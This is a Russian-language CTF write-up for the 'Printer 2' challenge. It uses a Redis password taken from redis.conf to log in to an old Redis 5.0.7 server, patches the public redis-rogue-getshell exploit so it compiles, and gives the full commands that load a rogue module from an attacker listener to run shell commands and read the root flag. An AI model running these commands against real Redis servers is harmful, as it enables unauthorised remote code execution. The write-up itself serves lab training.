# Принтер 2

В полученном [redis.conf](redis.conf) находим пароль: `NTO_r3d15_p455w0rd`

Подключаемся с ним к этому хосту (где и ftp)

```
> redis-cli -h 10.10.1.110
10.10.1.110:6379> auth NTO_r3d15_p455w0rd
OK
10.10.1.110:6379> info server
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 6.8.0-55-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:9
run_id:9343920494e6d8857b2cde72fb4ea1d6d9e80827
tcp_port:6379
uptime_in_seconds:207163
uptime_in_days:2
hz:10
configured_hz:10
lru_clock:15042160
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf
```

Видим старую версию redis, для которой находится уязвимость и [эксплойт к ней](https://github.com/vulhub/redis-rogue-getshell)

Изначально, он не компилируется. Чинится гуглом ошибки. Вот изменения
```
diff --git a/RedisModulesSDK/exp/exp.c b/RedisModulesSDK/exp/exp.c
index cfeb95e..dc9bffc 100644
--- a/RedisModulesSDK/exp/exp.c
+++ b/RedisModulesSDK/exp/exp.c
@@ -1,13 +1,16 @@
 #include "redismodule.h"
 

+#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
+#include <string.h>

 
 int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
        if (argc == 2) {
```

Собираем модуль, запускаем сплойт, смотрим на домашнюю папку рута, читаем флаг:
```bash
python3 redis-master.py -r 10.10.1.110 -p 6379 -L 10.5.5.164 -P 41109 -c 'ls ~' -a NTO_r3d15_p455w0rd -f RedisModulesSDK/exp.so
python3 redis-master.py -r 10.10.1.110 -p 6379 -L 10.5.5.164 -P 41109 -c 'cat ~/reallylongfilename4NTOflag' -a NTO_r3d15_p455w0rd -f RedisModulesSDK/exp.so
```

**Флаг:** `nto{d0n7_0v3r3xp0s3_ur_r3d15}`